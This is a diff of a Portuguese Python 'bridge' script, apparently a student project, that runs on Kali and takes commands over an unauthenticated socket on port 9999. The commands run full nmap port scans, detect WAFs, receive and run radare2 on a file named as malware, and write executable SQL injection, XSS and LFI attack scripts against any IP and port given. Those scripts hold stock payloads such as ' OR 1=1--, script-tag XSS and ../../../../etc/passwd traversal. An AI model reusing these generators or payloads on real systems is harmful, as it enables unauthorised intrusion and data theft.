@@ -1,24 +1,28 @@
+#!/usr/bin/env python3
 # Bridge de Network Scanning - Tema 12
-# Corre no Kali do Pedro recebe comandos do loader.py do jeremias
+# Corre no Kali do Pedro
+# "Se o loader pedir, eu dou"
 
 import socket
 import subprocess
 import os
 import time
-import threading  # <-- NOVO: para correr coisas em background
+import threading
 
 PORTA = 9999
 
-# Dicionário para guardar resultados de análises em background
-# Isto é como um "post-it" para o Kali lembrar-se do que já analisou
+# Dicionários para guardar análises
 analises_pendentes = {}
 analises_concluidas = {}
 
+# ========== COMANDOS EXISTENTES ==========
+
 def corre_nmap_portas(ip):
     try:
+        # Scan mais completo (todas as portas)
         r = subprocess.run(
-            ["nmap", "-F", ip],
-            capture_output=True, text=True, timeout=30
+            ["nmap", "-p-", "--min-rate", "1000", ip],
+            capture_output=True, text=True, timeout=60
         )
         return r.stdout
     except:
@@ -26,92 +30,108 @@ def corre_nmap_portas(ip):
 
 def corre_nmap_waf(ip):
     try:
+        # Primeiro descobre portas web
         r = subprocess.run(
-            ["nmap", "-p", "80,443", "--script", "http-waf-detect", ip],
-            capture_output=True, text=True, timeout=30
+            ["nmap", "-p-", "--min-rate", "1000", ip],
+            capture_output=True, text=True, timeout=60
         )
-        return r.stdout
+        
+        # Extrai portas web
+        portas_web = []
+        for linha in r.stdout.split("\n"):
+            if "/tcp" in linha and "open" in linha:
+                partes = linha.split("/")
+                if len(partes) >= 2:
+                    porta = partes[0].strip()
+                    if "http" in linha or "www" in linha or porta in ["80", "443", "8080", "8443"]:
+                        portas_web.append(porta)
+        
+        if not portas_web:
+            return "Nenhuma porta web encontrada."
+        
+        # Testa WAF nas portas encontradas
+        resultado = ""
+        for porta in portas_web[:5]:
+            r = subprocess.run(
+                ["nmap", "-p", porta, "--script", "http-waf-detect", ip],
+                capture_output=True, text=True, timeout=30
+            )
+            resultado += f"\n[WAF] Porta {porta}:\n{r.stdout}"
+        
+        return resultado
     except:
         return "Erro ao verificar WAF."
 
 def descomprime_upx(caminho):
-    # tenta descomprimir com upx
     try:
-        resultado = subprocess.run(
+        r = subprocess.run(
             ["upx", "-d", caminho, "-o", caminho + "_descomp"],
             capture_output=True, text=True, timeout=30
         )
-        if resultado.returncode == 0:
-            return f"UPX descompressao concluida. Ficheiro: {caminho}_descomp"
+        if r.returncode == 0:
+            return f"UPX descompressao: {caminho}_descomp"
         else:
-            return f"UPX falhou: {resultado.stderr}"
+            return f"UPX falhou: {r.stderr}"
     except:
-        return "Erro ao executar upx"
+        return "Erro no upx"
+
+# ========== RADARE2 EM BACKGROUND ==========
 
 def analisa_radare2_background(caminho, id_analise):
-    """
-    Esta função corre em background (numa thread separada).
-    Não bloqueia o fluxo principal.
-    """
-    print(f"[*] Background: A analisar {caminho} com Radare2...")
-    print(f"[*] ID da análise: {id_analise}")
+    """Corre em background - não bloqueia o loader"""
+    print(f"[*] Background: Radare2 a analisar {caminho}")
+    print(f"[*] ID: {id_analise}")
     
     try:
-        # Marca que a análise começou
         analises_pendentes[id_analise] = "A analisar..."
         
-        # Corre o Radare2 (pode demorar minutos)
+        # Corre o Radare2
         r = subprocess.run(
-            ["r2", "-A", "-q", "-c", "afl; q", caminho],
-            capture_output=True, text=True, timeout=600  # 10 minutos para ficheiros grandes
+            ["r2", "-A", "-q", "-c", "afl; izz; q", caminho],
+            capture_output=True, text=True, timeout=600
         )
         
-        # Guarda o resultado
         resultado = r.stdout[:1000]
         
-        # Se o resultado for muito pequeno, tenta outra abordagem
+        # Se não deu nada, tenta só strings
         if len(resultado) < 50:
-            # Tenta com strings
-            r2_strings = subprocess.run(
+            r2 = subprocess.run(
                 ["r2", "-q", "-c", "izz; q", caminho],
                 capture_output=True, text=True, timeout=60
             )
-            resultado += "\n\n[STRINGS]\n" + r2_strings.stdout[:500]
+            resultado += "\n[STRINGS]\n" + r2.stdout[:500]
         
-        # Guarda no dicionário de concluídas
         analises_concluidas[id_analise] = resultado
         
-        # Remove da lista de pendentes
         if id_analise in analises_pendentes:
             del analises_pendentes[id_analise]
-            
+        
         print(f"[*] Background: Análise {id_analise} concluída!")
         
     except Exception as e:
-        print(f"[!] Background: Erro na análise {id_analise}: {e}")
-        analises_concluidas[id_analise] = f"ERRO na análise: {e}"
+        print(f"[!] Background: Erro {id_analise}: {e}")
+        analises_concluidas[id_analise] = f"ERRO: {e}"
         if id_analise in analises_pendentes:
             del analises_pendentes[id_analise]
 
+# ========== RECEBER FICHEIRO ==========
+
 def recebe_ficheiro(conn):
-    """
-    Recebe o ficheiro do loader e devolve uma resposta RÁPIDA.
-    A análise profunda com Radare2 vai correr em background.
-    """
+    """Recebe o malware do loader - resposta rápida"""
     try:
-        # Recebe o tamanho do ficheiro
+        # Tamanho
         dados = conn.recv(1024).decode()
         if not dados:
-            return "ERRO: Não recebi tamanho"
-            
+            return "ERRO: Sem tamanho"
+        
         try:
             tamanho = int(dados.strip())
         except:
             return "ERRO: Tamanho inválido"
-            
+        
         conn.send(b"OK")
         
-        # 2. Recebe o ficheiro
+        # Recebe o ficheiro
         caminho = "/tmp/malware_recebido.exe"
         f = open(caminho, "wb")
         
@@ -124,79 +144,158 @@ def recebe_ficheiro(conn):
             recebido += len(dados)
         
         f.close()
-        print(f"[*] Ficheiro recebido: {recebido} bytes")
+        print(f"[*] Ficheiro: {recebido} bytes")
         
-        # 3. Recebe o FIM
+        # FIM
         fim = conn.recv(1024).decode()
         if fim != "FIM":
             print(f"[!] Não recebi FIM, recebi: {fim}")
         
-        # 4. RESPOSTA RÁPIDA (antes da análise)
-        resultado = f"Ficheiro recebido com sucesso!\n"
-        resultado += f"Tamanho: {recebido} bytes\n"
-        resultado += f"Guardado em: {caminho}\n"
-        resultado += f"\n[!] A analisar em background com Radare2...\n"
-        resultado += f"[!] O resultado estará disponível depois.\n"
+        # Resposta rápida
+        resultado = f"Ficheiro recebido! {recebido} bytes\n"
+        resultado += f"Guardado: {caminho}\n"
+        resultado += "\n[!] Radare2 em background...\n"
         
-        # 5. INICIA A ANÁLISE EM BACKGROUND
-        # Gera um ID único para esta análise
-        import time
+        # Inicia a análise em background
         id_analise = f"analise_{int(time.time())}_{os.path.basename(caminho)}"
         
-        # Cria uma thread para correr a análise
         thread = threading.Thread(
             target=analisa_radare2_background,
             args=(caminho, id_analise)
         )
-        thread.daemon = True  # A thread morre se o programa principal morrer
+        thread.daemon = True
         thread.start()
         
-        # Guarda o ID da análise para referência futura
         resultado += f"\nID da análise: {id_analise}\n"
         
         return resultado
         
     except Exception as e:
-        return f"ERRO ao receber ficheiro: {str(e)}"
+        return f"ERRO: {e}"
 
-def gera_exploit_simples(ip, porta, caminho_malware):
-    nome = f"/tmp/exploit_{ip.replace('.', '_')}_{porta}.py"
+# ========== EXPLOITS ESPECÍFICOS ==========
 
-    if porta == 445 or porta == "445":
-        tipo = "EternalBlue"
-        pay = f'b"\\\\\\\\{ip}\\\\IPC$"'
-    elif porta == 22 or porta == "22":
-        tipo = "SSH"
-        pay = 'b"SSH-2.0-Exploit"'
-    elif porta == 80 or porta == 443 or porta == "80" or porta == "443":
-        tipo = "Web"
-        pay = f'"GET / HTTP/1.1\\r\\nHost: {ip}\\r\\n\\r\\n".encode()'
-    else:
-        tipo = "Generico"
-        pay = 'b"EXPLOIT_PAYLOAD"'
-
-    codigo = f'''# Exploit gerado no Kali
+def gera_exploit_sqli(ip, porta):
+    nome = f"/tmp/exploit_sqli_{ip.replace('.', '_')}_{porta}.py"
+    
+    codigo = f'''#!/usr/bin/env python3
+# EXPLOIT SQL INJECTION
 # Alvo: {ip}:{porta}
-# Tipo: {tipo}
+
+import requests
+
+url = "http://{ip}:{porta}/"
+params = ["id", "page", "user", "q", "search"]
+payloads = ["' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--"]
+
+for p in params:
+    for pay in payloads:
+        try:
+            r = requests.get(f"{{url}}?{{p}}={{pay}}", timeout=5)
+            if "error" not in r.text.lower():
+                print(f"[+] SQLi: {{url}}?{{p}}={{pay}}")
+                break
+        except:
+            pass
+'''
+    
+    with open(nome, "w") as f:
+        f.write(codigo)
+    os.chmod(nome, 0o755)
+    return f"Exploit SQLi: {nome}"
+
+def gera_exploit_xss(ip, porta):
+    nome = f"/tmp/exploit_xss_{ip.replace('.', '_')}_{porta}.py"
+    
+    codigo = f'''#!/usr/bin/env python3
+# EXPLOIT XSS
+# Alvo: {ip}:{porta}
+
+import requests
+import urllib.parse
+
+url = "http://{ip}:{porta}/"
+params = ["q", "search", "s", "query", "keyword"]
+payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"]
+
+for p in params:
+    for pay in payloads:
+        pay_enc = urllib.parse.quote(pay)
+        try:
+            r = requests.get(f"{{url}}?{{p}}={{pay_enc}}", timeout=5)
+            if pay in r.text:
+                print(f"[+] XSS: {{url}}?{{p}}={{pay}}")
+                break
+        except:
+            pass
+'''
+    
+    with open(nome, "w") as f:
+        f.write(codigo)
+    os.chmod(nome, 0o755)
+    return f"Exploit XSS: {nome}"
+
+def gera_exploit_lfi(ip, porta):
+    nome = f"/tmp/exploit_lfi_{ip.replace('.', '_')}_{porta}.py"
+    
+    codigo = f'''#!/usr/bin/env python3
+# EXPLOIT LFI
+# Alvo: {ip}:{porta}
+
+import requests
+import urllib.parse
+
+url = "http://{ip}:{porta}/"
+params = ["file", "page", "path", "include", "doc"]
+payloads = ["../../../../etc/passwd", "../../../../etc/hosts", "../../../../windows/win.ini"]
+
+for p in params:
+    for pay in payloads:
+        pay_enc = urllib.parse.quote(pay)
+        try:
+            r = requests.get(f"{{url}}?{{p}}={{pay_enc}}", timeout=5)
+            if "root:x:" in r.text or "localhost" in r.text:
+                print(f"[+] LFI: {{url}}?{{p}}={{pay}}")
+                break
+        except:
+            pass
+'''
+    
+    with open(nome, "w") as f:
+        f.write(codigo)
+    os.chmod(nome, 0o755)
+    return f"Exploit LFI: {nome}"
+
+def gera_exploit_generico(ip, porta):
+    nome = f"/tmp/exploit_{ip.replace('.', '_')}_{porta}.py"
+    
+    codigo = f'''#!/usr/bin/env python3
+# EXPLOIT GENERICO
+# Alvo: {ip}:{porta}
 
 import socket
 
-s = socket.socket()
-s.settimeout(5)
-s.connect(("{ip}", {porta}))
-
-payload = {pay}
-s.send(payload)
-resp = s.recv(1024)
-print(resp[:100])
-s.close()
+try:
+    s = socket.socket()
+    s.settimeout(5)
+    s.connect(("{ip}", {porta}))
+    s.send(b"EXPLOIT_PAYLOAD")
+    resp = s.recv(1024)
+    print(resp[:100])
+    s.close()
+except Exception as e:
+    print(f"Erro: {{e}}")
 '''
+    
+    with open(nome, "w") as f:
+        f.write(codigo)
+    os.chmod(nome, 0o755)
+    return f"Exploit genérico: {nome}"
 
-    open(nome, "w").write(codigo)
-    return f"Exploit gerado: {nome}"
+# ========== PROCESSAR COMANDOS ==========
 
 def processa(comando, conn=None):
-    # processa comandos do loader
+    """Processa comandos do loader"""
     
     if comando == "ping":
         return "pong"
@@ -211,28 +310,33 @@ def processa(comando, conn=None):
     
     elif comando == "ENVIAR_FICHEIRO":
         if conn:
-            # O conn.send(b"OK") já está dentro do recebe_ficheiro()
             return recebe_ficheiro(conn)
         else:
-            return "ERRO: Comando ENVIAR_FICHEIRO sem conexao"
+            return "ERRO: Sem conexao"
     
     elif comando.startswith("gerar_exploit"):
-        # formato: gerar_exploit ip porta
         partes = comando.split(" ")
-        if len(partes) >= 3:
-            ip = partes[1]
-            porta = partes[2]
-            return gera_exploit_simples(ip, porta, "")
+        if len(partes) < 3:
+            return "ERRO: gerar_exploit <ip> <porta> [sqli|xss|lfi]"
+        
+        ip = partes[1]
+        porta = partes[2]
+        tipo = partes[3] if len(partes) >= 4 else "generic"
+        
+        if tipo == "sqli":
+            return gera_exploit_sqli(ip, porta)
+        elif tipo == "xss":
+            return gera_exploit_xss(ip, porta)
+        elif tipo == "lfi":
+            return gera_exploit_lfi(ip, porta)
         else:
-            return "ERRO: Uso: gerar_exploit <ip> <porta>"
+            return gera_exploit_generico(ip, porta)
     
-    # NOVO: comando para verificar o estado de uma análise
     elif comando.startswith("verificar_analise"):
         partes = comando.split(" ")
         if len(partes) >= 2:
             id_analise = partes[1]
             
-            # Verifica se a análise já está concluída
             if id_analise in analises_concluidas:
                 return f"ANALISE_CONCLUIDA\n{analises_concluidas[id_analise]}"
             elif id_analise in analises_pendentes:
@@ -240,10 +344,12 @@ def processa(comando, conn=None):
             else:
                 return "ANALISE_NAO_ENCONTRADA"
         else:
-            return "ERRO: Uso: verificar_analise <id>"
+            return "ERRO: verificar_analise <id>"
     
     else:
         return f"Comando desconhecido: {comando}"
+
+# ========== MAIN ==========
 
 def main():
     s = socket.socket()
@@ -252,29 +358,40 @@ def main():
     s.listen(1)
     
     print("="*50)
-    print("Bridge Scan - Kali do Pedro")
-    print(f"A escutar na porta {PORTA}")
-    print("Comandos disponiveis: scan, waf, ENVIAR_FICHEIRO, gerar_exploit, ping")
-    print("NOVO: verificar_analise <id>")
+    print(" BRIDGE SCAN - KALI DO PEDRO")
+    print("="*50)
+    print(f"\n[*] A escutar na porta {PORTA}")
+    print("\nComandos:")
+    print("  ping")
+    print("  scan <ip>")
+    print("  waf <ip>")
+    print("  ENVIAR_FICHEIRO")
+    print("  gerar_exploit <ip> <porta> [sqli|xss|lfi]")
+    print("  verificar_analise <id>")
     print("="*50)
     
     while True:
         conn, addr = s.accept()
         print(f"\n[*] Ligacao de {addr[0]}")
         
-        comando = conn.recv(4096).decode().strip()
-        print(f"[*] Comando: {comando}")
-        
-        resultado = processa(comando, conn)
-        
-        # Corta a resposta se for muito grande (para não sobrecarregar)
-        if len(resultado) > 4000:
-            resultado = resultado[:4000] + "\n[... TRUNCADO ...]"
+        try:
+            comando = conn.recv(4096).decode().strip()
+            print(f"[*] Comando: {comando}")
             
-        conn.send(resultado.encode())
-        conn.close()
+            resultado = processa(comando, conn)
+            
+            if len(resultado) > 4000:
+                resultado = resultado[:4000] + "\n[... TRUNCADO ...]"
+            
+            conn.send(resultado.encode())
+            
+        except Exception as e:
+            print(f"[!] Erro: {e}")
+            conn.send(f"ERRO: {e}".encode())
         
+        conn.close()
         print("[*] Resposta enviada")
+
 
 if __name__ == "__main__":
     main()
